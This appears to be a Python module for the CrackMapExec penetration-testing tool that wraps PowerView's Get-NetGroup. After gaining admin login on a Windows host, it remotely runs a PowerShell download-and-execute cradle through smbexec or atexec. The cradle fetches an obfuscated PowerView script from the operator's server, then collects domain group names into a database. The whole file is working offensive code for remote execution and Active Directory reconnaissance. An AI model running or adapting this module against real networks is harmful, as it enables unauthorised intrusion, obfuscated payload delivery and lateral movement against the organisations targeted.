from cme.helpers.powershell import *
from cme.helpers.logger import write_log, highlight
from datetime import datetime

class CMEModule():

    name = 'get_netgroup'
    description = "Wrapper for PowerView's Get-NetGroup"
    supported_protocols = ['mssql', 'smb']

    def  options(self, context, module_options):
        '''
        GROUPNAME Return all groups with the specifed string in their name (supports regex)
        USERNAME Return all groups that the specifed user belongs to (supports regex)
        '''

        self.group_name = None
        self.user_name = None
        self.domain = None

        if module_options and 'GROUPNAME' in module_options:
            self.group_name = module_options['GROUPNAME']

    def on_admin_login(self, context, connection):
        self.domain = connection.conn.getServerDomain()

        command = 'Get-NetGroup | Out-String'
        if self.group_name : command = 'Get-NetGroup -GroupName {} | Out-String'.format(self.group_name)

        launcher = gen_ps_iex_cradle(context.server, context.localip, context.server_port, 'PowerView.ps1', command)
        ps_command = create_ps_command(launcher)

        connection.execute(ps_command, methods=['smbexec', 'atexec'])
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'PowerView.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            with open(get_ps_script('PowerSploit/Recon/PowerView.ps1'), 'r') as ps_script:
                payload = obfs_ps_script(ps_script.read())
                request.wfile.write(payload)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        group_count = 0
        if len(data):
            context.log.info('Parsing output, please wait...')
            buf = StringIO(data).readlines()
            for line in buf:
                context.db.add_group(self.domain, line.strip())
                group_count += 1

            context.log.success('Added {} groups to the database'.format(highlight(group_count)))
